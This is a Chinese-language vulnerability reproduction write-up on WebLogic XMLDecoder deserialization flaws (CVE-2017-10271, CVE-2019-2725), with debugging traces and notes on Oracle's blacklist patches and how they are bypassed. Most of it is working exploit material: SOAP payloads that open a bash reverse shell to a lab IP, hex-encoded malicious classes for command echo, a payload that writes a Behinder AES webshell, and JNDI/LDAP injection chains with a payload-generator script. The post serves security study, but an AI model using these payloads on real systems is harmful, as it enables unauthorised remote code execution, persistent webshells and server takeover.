poc如下(注意其中反弹shell的语句，需要进行html编码，否则解析XML的时候将出现格式错误)：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java>
        <object class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
            <void index="0">
                <string>/bin/bash</string>
            </void>
            <void index="1">
                <string>-c</string>
            </void>
            <void index="2">
                <string>bash -i >& /dev/tcp/192.168.111.178/6666 0>&1</string>
            </void>
            </array>
            <void method="start"/>
        </object>
        </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```
这里要注意`Content-type`要设置为`text/xml`，不然会报415错误
![](https://img-blog.csdnimg.cn/0ef649ead5b04e72b13a47d75858f0b0.png)

还可以使用PrintWriter写webshell，路径可参考：[weblogic上传木马路径选择](https://www.cnblogs.com/sstfy/p/10350915.html)，但比较鸡肋，因为需要写入权限，并且路径都是随机数

动态调试跟进前将 lib 目录加入到项目的 Libraries 中即可
断点下到`weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequest`
![](https://img-blog.csdnimg.cn/d1af2b0ab6584c7cb63b5bcdcc0d9a1a.png)

var1是我们post传入的内容，var3是xml的头部解析，如果不为空，就进入`readHeaderOld()`方法，继续调试
![](https://img-blog.csdnimg.cn/aee77c84242747b7b7f9b4523e1806bd.png)


最终可以看到在`weblogic.wsee.workarea.WorkContextXmlInputAdapter#readUTF`执行了`readObject()`方法，对XMLDecoder对象进行了反序列化
![](https://img-blog.csdnimg.cn/f8e3113fddba41d691fbd8e9f5001a6b.png)

调用栈如下：
```
readObject:250, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
__doRun:866, Fiber (com.sun.xml.ws.api.pipe)
_doRun:815, Fiber (com.sun.xml.ws.api.pipe)
doRun:778, Fiber (com.sun.xml.ws.api.pipe)
runSync:680, Fiber (com.sun.xml.ws.api.pipe)
process:403, WSEndpointImpl$2 (com.sun.xml.ws.server)
handle:539, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)
handle:253, HttpAdapter (com.sun.xml.ws.transport.http)
handle:140, ServletAdapter (com.sun.xml.ws.transport.http.servlet)
handle:171, WLSServletAdapter (weblogic.wsee.jaxws)
run:708, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)
doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
runAs:146, SecurityManager (weblogic.security.service)
authenticatedInvoke:103, ServerSecurityHelper (weblogic.wsee.util)
run:311, HttpServletAdapter$3 (weblogic.wsee.jaxws)
post:336, HttpServletAdapter (weblogic.wsee.jaxws)
doRequest:99, JAXWSServlet (weblogic.wsee.jaxws)
service:99, AbstractAsyncServlet (weblogic.servlet.http)
service:820, HttpServlet (javax.servlet.http)
run:227, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
invokeServlet:125, StubSecurityHelper (weblogic.servlet.internal)
execute:301, ServletStubImpl (weblogic.servlet.internal)
execute:184, ServletStubImpl (weblogic.servlet.internal)
wrapRun:3732, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
run:3696, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)
runAs:120, SecurityManager (weblogic.security.service)
securedExecute:2273, WebAppServletContext (weblogic.servlet.internal)
execute:2179, WebAppServletContext (weblogic.servlet.internal)
run:1490, ServletRequestImpl (weblogic.servlet.internal)
execute:256, ExecuteThread (weblogic.work)
run:221, ExecuteThread (weblogic.work)
```

参考：
[https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271](https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271)

#### 回显构造
恶意类代码如下：
```java
package com.supeream.exploits;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

public class XmlExp {
    public XmlExp() {
    }

    public InputStream say(String cmd) throws Exception {
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }

        List<String> cmds = new ArrayList();
        if (cmd.startsWith("$NO$")) {
            cmds.add(cmd.substring(4));
        } else if (isLinux) {
            cmds.add("/bin/bash");
            cmds.add("-c");
            cmds.add(cmd);
        } else {
            cmds.add("cmd.exe");
            cmds.add("/c");
            cmds.add(cmd);
        }

        ProcessBuilder processBuilder = new ProcessBuilder(cmds);
        processBuilder.redirectErrorStream(true);
        Process proc = processBuilder.start();
        return proc.getInputStream();
    }
}
```
这里使用DefiningClassLoader加载恶意类，weblogic10的payload如下：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <void class="weblogic.utils.Hex" method="fromHexString" id="cls">
                    <string>0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034</string>
                </void>
                <void class="org.mozilla.classfile.DefiningClassLoader">
                    <void method="defineClass">
                        <string>com.supeream.exploits.XmlExp</string>
                        <object idref="cls"></object>
                        <void method="newInstance">
                            <void method="say" id="proc">
                                <string>ls</string>
                            </void>
                        </void>
                    </void>
                </void>
                <void class="java.lang.Thread" method="currentThread">
                    <void method="getCurrentWork">
                        <void method="getResponse">
                            <void method="getServletOutputStream">
                                <void method="writeStream">
                                    <object idref="proc"></object>
                                </void>
                                <void method="flush"/>
                            </void>
                            <void method="getWriter"><void method="write"><string></string></void></void>
                        </void>
                    </void>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```
getCurrentWork拿到的是WorkAdapter类，而WorkAdapter类和ServletRequestImpl有继承关系，可以直接强制类型转换
![](https://img-blog.csdnimg.cn/201c621a16ad480cb10c100805d51ee1.png)

然后再调用getResponse方法即可获得ServletResponseImpl类
![](https://img-blog.csdnimg.cn/6ab3ba67e6bb4eae9009d0dc2e8c41fd.png)

最后的回显就是调用getServletOutputStream进行输出了
![](https://img-blog.csdnimg.cn/c7656422e1b44f24ac03bcba673e0de0.png)

但是weblogic 12和10版本获取 ServletResponseImpl 类的方法不同
>weblogic 12是从当前线程类获得 ContainerSupportProviderImpl 类，通过对 ContainerSupportProviderImpl 类的 connectionHandler 字段的反射获得了 HttpConnectionHandler 类，再使用 HttpConnectionHandler 类的 getServletResponse 方法就能拿到 ServletResponseImpl 类来完成后面的回显

```java
ExecuteThread executeThread = (ExecuteThread)Thread.currentThread();
ServletResponseImpl servletResponse = null;
WorkAdapter workAdapter = executeThread.getCurrentWork();
WebAppServletContext webAppServletContext = null;
if (workAdapter.getClass().getName().contains("ContainerSupportProviderImpl")) {
    /*weblogic 12 */
    Field field = workAdapter.getClass().getDeclaredField("connectionHandler");
    field.setAccessible(true);
    HttpConnectionHandler httpConnectionHandler = (HttpConnectionHandler)field.get(workAdapter);
    webAppServletContext = httpConnectionHandler.getServletRequest().getContext();
    servletResponse = httpConnectionHandler.getServletResponse();
}
else if (workAdapter instanceof ServletRequestImpl) {
    /*weblogic 10 */
    ServletRequestImpl servletRequest = (ServletRequestImpl)workAdapter;
    servletResponse = servletRequest.getResponse();
}
```

我们可以直接反射获取servletResponse，最终通用回显的payload(注意最好使用jdk低版本进行编译，因为高版本兼容低版本但低版本不兼容高版本)：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <void class="weblogic.utils.Hex" method="fromHexString" id="cls">
                    <string>cafebabe0000003300c30a002b005d0a005e005f0700600a000300610a002b00620a006300640800650a006600670800680a006300690a006a006b0a006a006c08003907006d07006e0a000f006f0700700800710a007200730a006600740800750700760a0016005d0800770a006600780a006600790b007a007b08007c08007d08007e08007f0700800a002000810a002000820a002000830a000e00840a008500860a008700880a000e008908008a0a008b008c07008d07008e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100084c586d6c4578703b010003736179010015284c6a6176612f6c616e672f537472696e673b29560100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01001568747470436f6e6e656374696f6e48616e646c65720100124c6a6176612f6c616e672f4f626a6563743b010008726573706f6e736501000e736572766c65745265717565737401002e4c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c657452657175657374496d706c3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000d6578656375746554687265616401001d4c7765626c6f6769632f776f726b2f457865637574655468726561643b01000f736572766c6574526573706f6e736501002f4c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c6574526573706f6e7365496d706c3b01000b776f726b4164617074657201001b4c7765626c6f6769632f776f726b2f576f726b416461707465723b010014776562417070536572766c6574436f6e746578740100304c7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e746578743b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507008d07008f07006007006d07009007009107007007009201000a457863657074696f6e7301000a536f7572636546696c6501000b586d6c4578702e6a6176610c002c002d0700930c0094009501001b7765626c6f6769632f776f726b2f457865637574655468726561640c009600970c0098009907009a0c009b009c01001c436f6e7461696e6572537570706f727450726f7669646572496d706c07008f0c009d009e010011636f6e6e656374696f6e48616e646c65720c009f00a00700a10c00a200a30c00a400a501002d7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c6574526573706f6e7365496d706c01002c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c657452657175657374496d706c0c00a600a70100136a6176612f6c616e672f457863657074696f6e0100076f732e6e616d650700a80c00a900aa0c00ab009c01000377696e0100136a6176612f7574696c2f41727261794c697374010004244e4f240c00ac00ad0c00ae00af0700920c00b000b10100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c002c00b20c00b300b40c00b500b60c00b700b80700b90c00ba00bb0700bc0c00bd00be0c00bf00c00100000700c10c00c20034010006586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e670100197765626c6f6769632f776f726b2f576f726b4164617074657201002e7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e7465787401000e6a6176612f7574696c2f4c6973740100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657443757272656e74576f726b01001d28294c7765626c6f6769632f776f726b2f576f726b416461707465723b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000f6a6176612f6c616e672f436c6173730100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000b676574526573706f6e736501003128294c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c6574526573706f6e7365496d706c3b0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b010016676574536572766c65744f757470757453747265616d01003528294c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c65744f757470757453747265616d496d706c3b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100317765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c65744f757470757453747265616d496d706c01000b777269746553747265616d010018284c6a6176612f696f2f496e70757453747265616d3b295601000967657457726974657201001728294c6a6176612f696f2f5072696e745772697465723b0100136a6176612f696f2f5072696e7457726974657201000577726974650021002a002b0000000000020001002c002d0001002e0000003300010001000000052ab70001b100000002002f0000000a00020000000b0004000c00300000000c0001000000050031003200000001003300340002002e000002bf0003000b00000129b80002c000034d014e2cb600043a04013a051904b60005b600061207b6000899003e1904b600051209b6000a3a06190604b6000b19061904b6000c3a071907b60005120db6000a3a08190804b6000b19081907b6000cc0000e4ea700181904c1000f9900101904c0000f3a061906b600104ea700053a060436061212b800133a071907c600131907b600141215b60008990006033606bb001659b700173a082b1218b6001999001319082b07b6001ab9001b020057a7004515069900231908121cb9001b0200571908121db9001b02005719082bb9001b020057a700201908121eb9001b0200571908121fb9001b02005719082bb9001b020057bb0020591908b700213a09190904b60022571909b600233a0a2db60024190ab60025b600262db600271228b60029b1000100120072007500110004002f0000009600250000000f0007001000090011000f00120012001500220017002e001800340019003d001a0049001b004f001c005a001d005d001e00650020006c0021007200240075002300770026007a002700810028009300290096002c009f002d00a8002e00b8002f00bd003000c7003100d1003200dd003400e7003500f1003600fa00390105003a010c003b0113003c011f003d0128003e003000000098000f002e002c003500360006003d001d00370038000700490011003900360008006c0006003a003b00060000012900310032000000000129003c003d000100070122003e003f000200090120004000410003000f011a00420043000400120117004400450005007a00af004600470006008100a80048003d0007009f008a0049004a000801050024004b004c000901130016004d004e000a004f0000000c0001009f008a0049005000080051000000300008ff005d00060700520700530700540700550700560700570000144207005801fd001e01070053fc0021070059241c005a00000004000100110001005b00000002005c</string>
                </void>
                <void class="org.mozilla.classfile.DefiningClassLoader">
                    <void method="defineClass">
                        <string>XmlExp</string>
                        <object idref="cls"></object>
                        <void method="newInstance">
                            <void method="say" id="proc">
                                <string>ls</string>
                            </void>
                        </void>
                    </void>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```
![](https://img-blog.csdnimg.cn/7926aa9cea71455b854a80316d548e90.png)

需要具体代码的话解密一下就可以了。其实不仅可以使用`weblogic.utils.Hex`，也可以使用`sun.misc.BASE64Decoder`或者`weblogic.utils.encoders.BASE64Decoder`，都是可以正常回显的




参考文章：
[Weblogic Xmldecoder反序列化中的命令回显与内存马总结](https://xz.aliyun.com/t/10323)
[CVE-2019-2725/CNVD-C-2019-48814终章——报文回显](https://cloud.tencent.com/developer/article/1472323)
[再谈 CVE-2017-10271回显POC构造](https://www.cnblogs.com/afanti/p/10887381.html)

#### 历史补丁
官方对CVE-2017-3506的修复是在`WorkContextXmlInputAdapter`中添加了validate验证，采用黑名单机制禁用了object标签
```java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
   }
```
但这也是非常简单绕过的，使用void或者new替换object即可
为什么可以这样用，来看一下 VoidElementHandler 的源码
![](https://img-blog.csdnimg.cn/5dbf998c7207471d8a32f863b40493a5.png)

可以看到 VoidElementHandler 是 ObjectElementHandler 类的子类

CVE-2017-10271的修复补丁为：
```java
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }
```

>本次更新中官方将object、new、method关键字继续加入到黑名单中，一旦解析XML元素过程中匹配到上述任意一个关键字就立即抛出运行时异常。但是针对void和array这两个元素是有选择性的抛异常，其中当解析到void元素后，还会进一步解析该元素中的属性名，若没有匹配上index关键字才会抛出异常。而针对array元素而言，在解析到该元素属性名匹配class关键字的前提下，还会解析该属性值，若没有匹配上byte关键字，才会抛出运行时异常

参考：
[Weblogic XMLDecoder RCE分析](https://paper.seebug.org/487/)
### CVE-2019-2725
wls9-async等组件为WebLogic Server提供异步通讯服务，默认应用于WebLogic部分版本。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者通过发送精心构造的恶意 HTTP 请求，即可获得目标服务器的权限，在未授权的情况下远程执行命令

影响版本：
```
Oracle WebLogic Server 10.*
Oracle WebLogic Server 12.1.3
```
访问`/_async/AsyncResponseService`，显示如下界面说明可能存在漏洞
![](https://img-blog.csdnimg.cn/1439096740df47619dda7c745b7ed0d8.png)

我们可以访问`/_async/AsyncResponseService?info`，得到网站的具体路径
![](https://img-blog.csdnimg.cn/00dd773f8e22412f9dece48c3c5430f0.png)

无补丁的payload：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp</string>
    <void method="println"><string>
    <![CDATA[
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
![](https://img-blog.csdnimg.cn/77de5fb0f27a41a2a9d1110114297345.png)

看到返回202状态码，然后我们就可以在`/_async/shell.jsp`访问到我们的木马了，这里写入的是冰蝎马，测试连接
![](https://img-blog.csdnimg.cn/e5583552048d4233b72c3c7aa7b1360a.png)

**但是这种利用是没有补丁的情况下才可以利用的，如果使用了CVE-2017-10271的补丁，是不能这样利用的**

官方文档写到：[https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html](https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html)
![](https://img-blog.csdnimg.cn/adb7017cfcd34774bb3f5565c9f160a7.png)

可以知道class元素节点同样可以指定任意的类名，但是我们没有办法指定该类的任意方法，所以我们需要在序列化对象实例化时会自动调用其构造方法，且其构造方法的参数类型恰好是字节数组或者是java中的基础数据类型，比如string，int这些，这样就可以满足array元素和void元素的限制条件


有一个简单的探测出网以及是否存在漏洞方式，使用`java.net.Socket`
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>java.net.Socket</string><void><string>192.168.111.178</string><int>6666</int></void></class></java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

#### UnitOfWorkChangeSet
最终找到关键的类：`oracle.toplink.internal.sessions.UnitOfWorkChangeSet`，这个类只存在于10.3.6当中
看一下他的构造方法
![](https://img-blog.csdnimg.cn/852365cf3b124ac5ab795829ca92d838.png)

看到是一个readObject，二次反序列化，那么我们可以利用原生jdk7u21 gadget来进行反序列化，exp如下：[https://github.com/lufeirider/CVE-2019-2725](https://github.com/lufeirider/CVE-2019-2725)，但是这条利用链条件十分有限，只能打jdk7u21

后面找到了`com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager`这个类
![](https://img-blog.csdnimg.cn/05133569caa14f5796e638ad2a052953.png)

它的readObject中调用了`initUserTransactionAndTransactionManager`方法，继续跟进
![](https://img-blog.csdnimg.cn/51d203de26fe419bb3f4e906b0d39f8f.png)

可以看到将`this.userTransactionName`传递到了`lookupUserTransaction`函数中
![](https://img-blog.csdnimg.cn/ae10256056264186b5040957f576b43b.png)

跟进可以发现是一个jndi注入，虽然存在jdk版本的限制，不过总比jdk7u21好使，生成payload.xml的脚本如下：
```java
import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;

import java.io.ByteArrayOutputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class exp
{
    public static void main( String[] args ) throws Exception {
        String command ="ldap://192.168.111.178:1389/Basic/ReverseShell/192.168.111.178/6666";
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName(command);
        byte[] bytes = ObjectToByte(jtaTransactionManager);

        objectXmlEncoder(bytes , "payload.xml");
    }
    private static byte[] ObjectToByte(Object obj) {
        byte[] bytes = null;
        try {
            // object to bytearray
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            ObjectOutputStream oo = new ObjectOutputStream(bo);
            oo.writeObject(obj);

            bytes = bo.toByteArray();

            bo.close();
            oo.close();
        } catch (Exception e) {
            System.out.println("translation" + e.getMessage());
            e.printStackTrace();
        }
        return bytes;
    }

    public static void objectXmlEncoder(Object obj,String fileName)
            throws FileNotFoundException, IOException,Exception
    {
        java.io.File file = new java.io.File(fileName);
        if(!file.exists()){
            file.createNewFile();
        }
        java.io.BufferedOutputStream oop = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file));
        java.beans.XMLEncoder xe = new java.beans.XMLEncoder(oop);
        xe.flush();
        //写入xml
        xe.writeObject(obj);
        xe.close();
        oop.close();
    }
}
```
运行之后将生成的payload.xml内容拷贝即可(从 `<array>`到`</array>`)
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>
需要拼接的部分</void></class>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```
最终复现成功
![](https://img-blog.csdnimg.cn/6ed7fa72e414484d86804ebb7e1187fb.png)

#### JdbcRowSetImpl
然后还有一个jndi注入的方式，在jdk 1.7以及之后的版本中才能利用，看到类`com.sun.beans.decoder.DocumentHandler`
![](https://img-blog.csdnimg.cn/cd0fbf660549495ba9b24aafb9a7a566.png)

新增了`property`标签，他会调用setter方法
那么我们构造一下`com.sun.rowset.JdbcRowSetImpl`的利用链，最后的payload为：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>com.sun.rowset.JdbcRowSetImpl</string><void>
<property name="dataSourceName"><string>ldap://192.168.111.178:1389/Basic/ReverseShell/192.168.111.178/6666</string></property><property name="autoCommit"><boolean>true</boolean></property>
</void></class>
</java>
</work:WorkContext>
</soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```
成功反弹shell
![](https://img-blog.csdnimg.cn/7c91a3cd2ebd40148d1d6006a10329f5.png)

这也算一个另类的绕过技巧吧


#### FileSystemXmlApplicationContext
我们可以看到类`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`，首先是一个初始化
![](https://img-blog.csdnimg.cn/0eb31fbe632a41748c688d47ec138488.png)

然后进到了`AbstractBeanDefinitionReader`类，加载spring的配置文件来进行rce
![](https://img-blog.csdnimg.cn/ed88ce43b7e448a28bfcf9ccfbb7fc89.png)

